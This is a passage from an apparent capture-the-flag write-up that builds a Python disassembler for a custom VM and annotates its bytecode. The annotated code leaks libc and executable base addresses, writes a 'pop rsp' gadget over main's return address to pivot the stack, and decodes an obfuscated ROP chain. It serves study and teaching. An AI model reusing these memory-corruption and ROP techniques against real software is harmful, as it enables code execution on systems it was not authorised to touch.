    <span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">:</span>
        <span class="p">....</span>
        <span class="n">match</span> <span class="n">opcode</span><span class="p">:</span>
            <span class="p">....</span>
            <span class="c1">## Artifical instructions
</span>            <span class="n">case</span> <span class="n">PushImm</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">imm</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">push </span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">imm</span><span class="p">]</span><span class="si">}</span><span class="s"> ; 0x</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">push 0x</span><span class="si">{</span><span class="n">imm</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">PushReg</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">push r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">Pop</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">pop r</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
            <span class="n">case</span> <span class="n">_</span><span class="p">:</span>
            <span class="p">...</span>
</code></pre></div></div>

<p>Now we build a matcher to do a pass and create these instructions</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pass_push_pop_inst</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:]:</span>
            <span class="n">case</span> <span class="p">[</span><span class="n">MovImm</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">8</span><span class="p">),</span> <span class="n">Sub</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="n">imm</span><span class="p">),</span> <span class="n">MemStore</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span><span class="p">]:</span>
                <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PushImm</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">imm</span><span class="p">),)</span>
            <span class="n">case</span> <span class="p">[</span><span class="n">MovImm</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">8</span><span class="p">),</span> <span class="n">Sub</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span> <span class="n">MemStore</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">src</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span><span class="p">]:</span>
                <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">PushReg</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">src</span><span class="p">),)</span>
            <span class="n">case</span> <span class="p">[</span><span class="n">MemLoad</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="mi">15</span><span class="p">),</span> <span class="n">MovImm</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">8</span><span class="p">),</span> <span class="n">Add</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="mi">0</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span><span class="p">]:</span>
                <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Pop</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">dst</span><span class="p">),)</span>
        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="p">...</span>
    <span class="n">instructions</span>  <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="nb">buffer</span><span class="p">[:</span><span class="n">start_of_data</span><span class="p">])</span>
    <span class="n">pass_push_pop_inst</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
    <span class="p">...</span>
</code></pre></div></div>

<p><strong>NOTE:</strong> Doing these passes which consolidate instructions the intermediate registers (e.g. <code class="language-plaintext highlighter-rouge">r0</code>) are also changed so if your reading the assembly output you also need to assume the have changed <code class="language-plaintext highlighter-rouge">r0</code> too (looking at the output <code class="language-plaintext highlighter-rouge">r0</code> seems to be a random temporary register which always gets changed)</p>

<p>Now that we have this it starts to look a lot nicer</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	push LAB_59 ; 0x59
	jump LAB_2353

LAB_59:
	push 0x78
	jump LAB_2584
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	pop r1
	jump r1
</code></pre></div></div>

<h3 id="adding-callret-artifical-instructions">Adding call/ret artifical instructions</h3>

<p>Now let’s build a pass which will create some <code class="language-plaintext highlighter-rouge">Call</code> and <code class="language-plaintext highlighter-rouge">Ret</code> instructions to make these even better.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Call</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Call'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span> <span class="s">'target'</span><span class="p">])</span>
<span class="n">Ret</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Ret'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">])</span>
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">instructions</span><span class="p">,</span> <span class="n">labels</span><span class="p">):</span>
<span class="p">...</span>
            <span class="n">case</span> <span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">call </span><span class="si">{</span><span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
            <span class="n">case</span> <span class="n">Ret</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="se">\t</span><span class="s">ret'</span><span class="p">)</span>
                <span class="k">print</span><span class="p">()</span>
</code></pre></div></div>

<p>As the <code class="language-plaintext highlighter-rouge">Jump</code> is about to change with these we need to also add <code class="language-plaintext highlighter-rouge">Call</code> to the <code class="language-plaintext highlighter-rouge">find_labels</code></p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_labels</span><span class="p">(</span><span class="n">instructions</span><span class="p">,</span> <span class="n">start_of_data</span><span class="p">,</span> <span class="n">end_of_data</span><span class="p">):</span>
    <span class="n">labels</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">opcode</span> <span class="ow">in</span> <span class="n">instructions</span><span class="p">:</span>
        <span class="n">match</span> <span class="n">opcode</span><span class="p">:</span>
            <span class="p">...</span>
            <span class="n">case</span> <span class="n">Call</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">):</span>
                <span class="n">labels</span><span class="p">[</span><span class="n">target</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'FUNC_</span><span class="si">{</span><span class="n">target</span><span class="p">:</span><span class="n">x</span><span class="si">}</span><span class="s">'</span>
    <span class="k">return</span> <span class="n">labels</span>
</code></pre></div></div>

<p>Then we finally we build a pass which goes over it</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pass_call_ret_inst</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:]:</span>
            <span class="n">case</span> <span class="p">[</span><span class="n">PushImm</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">imm</span><span class="p">),</span> <span class="n">Jump</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">target</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span><span class="p">]</span> <span class="k">if</span> <span class="n">imm</span> <span class="o">==</span> <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">].</span><span class="n">addr</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">target</span><span class="p">),)</span>
            <span class="n">case</span> <span class="p">[</span><span class="n">Pop</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="n">addr</span><span class="p">,</span> <span class="n">reg</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span> <span class="n">JumpReg</span><span class="p">(</span><span class="n">reg</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span> <span class="o">*</span><span class="n">_</span><span class="p">]:</span>
                <span class="n">instructions</span><span class="p">[</span><span class="n">idx</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Ret</span><span class="p">(</span><span class="n">addr</span><span class="p">),)</span>
        <span class="n">idx</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>This needs to run after the <code class="language-plaintext highlighter-rouge">push</code>/<code class="language-plaintext highlighter-rouge">pop</code> pass as it depends on it</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">pass_push_pop_inst</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
    <span class="n">pass_call_ret_inst</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
</code></pre></div></div>

<p>Now let’s see how this compares</p>
<table>
<tr>
<th>Original</th>
<th>With push/pop</th>
<th>With call/ret</th>
</tr>
<tr>
<td>
<pre>
mov r0, 0x8
sub r15, r0
mov r0, LAB_59 ; 0x59
store mem[r15], r0
jump LAB_2353
</pre>
</td>
<td>
<pre>
push LAB_59 ; 0x59
jump LAB_2353
</pre>
</td>
<td>
<pre>
call FUNC_2353
</pre>
</td>
</tr>
<tr>
<td>
<pre>
mov r1, mem[r15]
mov r0, 0x8
add r15, r0
jump r1
</pre>
</td>
<td>
<pre>
pop r1
jump r1
</pre>
</td>
<td>
<pre>ret</pre>
</td>
</tr>
</table>

<p>See how much better it is? Did I tell you matchers in Python are awesome?</p>

<h2 id="understanding-the-disassembly">Understanding the disassembly</h2>

<p>Now have the code in a much more easy to understand format, let’s start digging into the program and how it works.</p>

<p>From the entry point immediately after the stack get’s setup then <code class="language-plaintext highlighter-rouge">FUNC_59</code> get’s called which right at the start calls <code class="language-plaintext highlighter-rouge">FUNC_2584</code>, which is the first big juicy function that we’ll be looking at.</p>

<p>Here is the code for it, I’ve added the disassasmbly here and some comments</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">FUNC_2584:</span>
    <span class="c1">// Get the stdin pointer by reading the address at mem[-0x30]</span>
    <span class="n">mov</span> <span class="n">r2</span><span class="p">,</span> <span class="mh">0x30</span>
    <span class="n">mov</span> <span class="n">r3</span><span class="p">,</span> <span class="mh">0x0</span>
    <span class="n">sub</span> <span class="n">r3</span><span class="p">,</span> <span class="n">r2</span>
    <span class="n">mov</span> <span class="n">r2</span><span class="p">,</span> <span class="n">mem</span><span class="p">[</span><span class="n">r3</span><span class="p">]</span>

    <span class="c1">// Get the libc base address by subtracting 0x1eb980 from stdin (_IO_2_1_stdin_ in libc)</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1eb980</span>
    <span class="n">sub</span> <span class="n">r2</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// Get the address where the environ pointer (stack pointer) is stored by adding 0x1ef2e0 to the base </span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1ef2e0</span>
    <span class="n">mov</span> <span class="n">r3</span><span class="p">,</span> <span class="n">r2</span>
    <span class="n">add</span> <span class="n">r3</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// Get the wide_pointer buffer pointer from memory allocated by the file pointer by looking at rom[-0x1150]</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1150</span>
    <span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x0</span>
    <span class="n">sub</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r0</span>
    <span class="n">mov</span> <span class="n">r4</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r1</span><span class="p">]</span>

    <span class="c1">// Get a pointer to the 'rom' calculated based on the wide_pointer</span>
    <span class="c1">// This is an important pointer as now it can be used with any calcutions to get an absolute address relative to the rom</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1100</span>
    <span class="n">add</span> <span class="n">r4</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// Get the value stored in the 'environ' pointer (the stack abse pointer)</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
    <span class="n">sub</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r4</span>
    <span class="n">mov</span> <span class="n">r5</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>

    <span class="c1">// Get the address of 'main' by reading from environ/stackbase-0xe8</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0xe8</span>
    <span class="n">mov</span> <span class="n">r6</span><span class="p">,</span> <span class="n">r5</span>
    <span class="n">sub</span> <span class="n">r6</span><span class="p">,</span> <span class="n">r0</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r6</span>
    <span class="n">sub</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r4</span>
    <span class="n">mov</span> <span class="n">r6</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r0</span><span class="p">]</span>

    <span class="c1">// Get the base address of 'breach' by subtracting the address of main (0x1229)</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x1229</span>
    <span class="n">sub</span> <span class="n">r6</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// r7 = stackbase-0x108 (the pointer of return __libc_start_main from main)</span>
    <span class="n">mov</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r5</span>
    <span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x108</span>
    <span class="n">sub</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// r3 = breach base address</span>
    <span class="c1">// r4 = stack pointer for returning from `main`</span>
    <span class="n">mov</span> <span class="n">r3</span><span class="p">,</span> <span class="n">r6</span>
    <span class="n">mov</span> <span class="n">r4</span><span class="p">,</span> <span class="n">r7</span>
    <span class="n">call</span> <span class="n">FUNC_276d</span>

	<span class="n">mov</span> <span class="n">r4</span><span class="p">,</span> <span class="mh">0x8000</span>
	<span class="n">mov</span> <span class="n">r5</span><span class="p">,</span> <span class="n">DAT_27f3</span> <span class="p">;</span> <span class="mh">0x27f3</span>
	<span class="n">call</span> <span class="n">FUNC_2667</span>

	<span class="n">halt</span>
	<span class="n">ret</span>
</code></pre></div></div>

<p>From this function we can tell that it’s calculated a bunch of offsets to get the base address of libc and breach along, this is likely initialization code now we have two final functions to look at within <code class="language-plaintext highlighter-rouge">FUNC_2584</code> which are <code class="language-plaintext highlighter-rouge">FUNC_276d</code> and <code class="language-plaintext highlighter-rouge">FUNC_2667</code> then it finally <code class="language-plaintext highlighter-rouge">halt</code>’s and returns, because it’s got addresses which could be used for building a ROP chain you might already suspect that <code class="language-plaintext highlighter-rouge">halt</code> is going to be used to execute a ROP chain.</p>

<p>Let’s dig into <code class="language-plaintext highlighter-rouge">FUNC_276d</code> now</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// r2 = libc base address</span>
<span class="c1">// r3 = breach base address</span>
<span class="c1">// r4 = stack pointer for returning from 'main' (ROP pointer)</span>
<span class="n">FUNC_276d</span><span class="o">:</span>
    <span class="c1">// Get the address of the stack ROP pointer relative to 'mem' (base+0x4060)</span>
	<span class="n">mov</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r4</span>
	<span class="n">sub</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r3</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x4060</span>
	<span class="n">sub</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// Store the address of a 'pop rsp' gadget from libc in the return from main address</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r2</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x32b5a</span>
	<span class="n">add</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r9</span><span class="p">],</span> <span class="n">r0</span>

    <span class="c1">// Shift the address it was stored at by 8 (the next pointer)</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x8</span>
	<span class="n">add</span> <span class="n">r9</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// Store a pointer to &amp;mem[0x8000] (exe base + 0xc060)</span>
	<span class="n">mov</span> <span class="n">r10</span><span class="p">,</span> <span class="n">r3</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0xc060</span>
	<span class="n">add</span> <span class="n">r10</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r9</span><span class="p">],</span> <span class="n">r10</span>
	<span class="n">ret</span>
</code></pre></div></div>

<p>Overall this function modifies the stack where the return from <code class="language-plaintext highlighter-rouge">main</code> occurs and changes it so that it does the ROP <code class="language-plaintext highlighter-rouge">pop rsp; exe+0xc060</code> meaning that the stack pointer will now be pointing to <code class="language-plaintext highlighter-rouge">mem[0x8000]</code>, this likely allows more easy building of ROP chains as it’s just a write to <code class="language-plaintext highlighter-rouge">mem</code> without doing these same offset calculations.</p>

<p>Now let’s look at <code class="language-plaintext highlighter-rouge">FUNC_2667</code>, it’s a bit more of a monster (it also get’s called in a few places so gives us more benefits then the other two we just looked at which just get called once)</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// r2 = libc base address</span>
<span class="c1">// r3 = breach base address</span>
<span class="c1">// r4 = Some destination memory location</span>
<span class="c1">// r5 = Some source data address</span>
<span class="n">FUNC_2667</span><span class="o">:</span>
    <span class="c1">// self explainitory -- we pop this before the ret also</span>
	<span class="n">push</span> <span class="n">r6</span>
	<span class="n">push</span> <span class="n">r7</span>

<span class="n">LAB_2681</span><span class="o">:</span>
    <span class="c1">// Read from the source address and xor the value by 0x676e614765636944</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">rom</span><span class="p">[</span><span class="n">r5</span><span class="p">]</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0x676e614765636944</span>
	<span class="n">xor</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span>

    <span class="c1">// If the value is equal to 0xdeadbeefdeadbeef then return (exit loop)</span>
	<span class="n">mov</span> <span class="n">r1</span><span class="p">,</span> <span class="mh">0xdeadbeefdeadbeef</span>
	<span class="n">jumpeq</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">LAB_2745</span>

    <span class="c1">// r6 = The lower 7 bytes of the value (0x00ffffffffffffff)</span>
    <span class="c1">// r7 = The higher byte of the value (0xff00000000000000)</span>
	<span class="n">mov</span> <span class="n">r6</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0xffffffffffffff</span>
	<span class="n">and</span> <span class="n">r6</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x38</span>
	<span class="n">shr</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r0</span>

    <span class="c1">// If the higher byte is 0 then goto LAB_26fd</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x0</span>
	<span class="n">jumpeq</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">LAB_26fd</span>

    <span class="c1">// If the higher byte is 0x34 then goto LAB_2708</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x34</span>
	<span class="n">jumpeq</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">LAB_2708</span>

    <span class="c1">// If the higher byte is 0x56 then goto LAB_2717</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x56</span>
	<span class="n">jumpeq</span> <span class="n">r7</span><span class="p">,</span> <span class="n">r0</span><span class="p">,</span> <span class="n">LAB_2717</span>

    <span class="c1">// else continue looping</span>
	<span class="n">jump</span> <span class="n">LAB_2726</span>

<span class="n">LAB_26fd</span><span class="o">:</span>
    <span class="c1">// Store the value (lower 7 bytes) in r4</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r4</span><span class="p">],</span> <span class="n">r6</span>
	<span class="n">jump</span> <span class="n">LAB_2726</span>

<span class="n">LAB_2708</span><span class="o">:</span>
    <span class="c1">// Store (value+libc base) in r4</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r2</span>
	<span class="n">add</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r6</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r4</span><span class="p">],</span> <span class="n">r0</span>
	<span class="n">jump</span> <span class="n">LAB_2726</span>

<span class="n">LAB_2717</span><span class="o">:</span>
    <span class="c1">// Store (value+exe base) in r4</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
	<span class="n">add</span> <span class="n">r0</span><span class="p">,</span> <span class="n">r6</span>
	<span class="n">store</span> <span class="n">mem</span><span class="p">[</span><span class="n">r4</span><span class="p">],</span> <span class="n">r0</span>
	<span class="n">jump</span> <span class="n">LAB_2726</span>

<span class="n">LAB_2726</span><span class="o">:</span>
    <span class="c1">// Increment r5 and r4 to keep moving down the array</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x8</span>
	<span class="n">add</span> <span class="n">r5</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">mov</span> <span class="n">r0</span><span class="p">,</span> <span class="mh">0x8</span>
	<span class="n">add</span> <span class="n">r4</span><span class="p">,</span> <span class="n">r0</span>
	<span class="n">jump</span> <span class="n">LAB_2681</span>

<span class="n">LAB_2745</span><span class="o">:</span>
	<span class="n">pop</span> <span class="n">r7</span>
	<span class="n">pop</span> <span class="n">r6</span>
	<span class="n">ret</span>
</code></pre></div></div>

<p>This function is a bit of a magic copy function it copies data from <code class="language-plaintext highlighter-rouge">rom+r5</code> into <code class="language-plaintext highlighter-rouge">mem+r5</code> until it hits an end marker and depending on the data will either convert it into something which is relative to the libc or the executable’s base address. (A nice handy tool for storing ROP chains)</p>

<p>So looking back at the end of <code class="language-plaintext highlighter-rouge">FUNC_2584</code> we can add some more comments</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">FUNC_2584:</span>
    <span class="p">...</span>
    <span class="c1">// Setup ROP for moving stack to &amp;mem[0x8000]</span>
    <span class="n">mov</span> <span class="n">r3</span><span class="p">,</span> <span class="n">r6</span>
    <span class="n">mov</span> <span class="n">r4</span><span class="p">,</span> <span class="n">r7</span>
    <span class="n">call</span> <span class="n">FUNC_276d</span>

    <span class="c1">// Copy a rop chain DAT_27f3 into &amp;mem[0x8000]</span>
	<span class="n">mov</span> <span class="n">r4</span><span class="p">,</span> <span class="mh">0x8000</span>
	<span class="n">mov</span> <span class="n">r5</span><span class="p">,</span> <span class="n">DAT_27f3</span> <span class="p">;</span> <span class="mh">0x27f3</span>
	<span class="n">call</span> <span class="n">FUNC_2667</span>

	<span class="n">halt</span>
	<span class="n">ret</span>
</code></pre></div></div>

<p>Unfortunately if we look at <code class="language-plaintext highlighter-rouge">DAT_27f3</code> it isn’t very useful to understand</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">DAT_27f3:</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0x14</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0xcc</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0x67</span> <span class="p">;</span> <span class="n">g</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0x65</span> <span class="p">;</span> <span class="n">e</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0x47</span> <span class="p">;</span> <span class="n">G</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0x61</span> <span class="p">;</span> <span class="n">a</span>
	<span class="p">.</span><span class="n">db</span> <span class="mh">0x6e</span> <span class="p">;</span> <span class="n">n</span>
<span class="p">...</span>
</code></pre></div></div>

<p>Now let’s modify the disassembler so that we can more easily determine what these ROP chains.</p>

<h3 id="adding-rop-chain-dumping-to-the-disassembler">Adding ROP chain dumping to the disassembler</h3>

<p>The first thing we need to do is identify what blocks might be magic copies, to this we will just look for things which call <code class="language-plaintext highlighter-rouge">FUNC_2667</code> and extract the <code class="language-plaintext highlighter-rouge">r5</code> value</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">identify_magic_blocks</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
    <span class="n">total_instructions</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">magic_blocks</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">while</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">instructions</span><span class="p">):</span>
        <span class="c1"># Limit to 3 to avoid picking up unexpected instructions in the middle
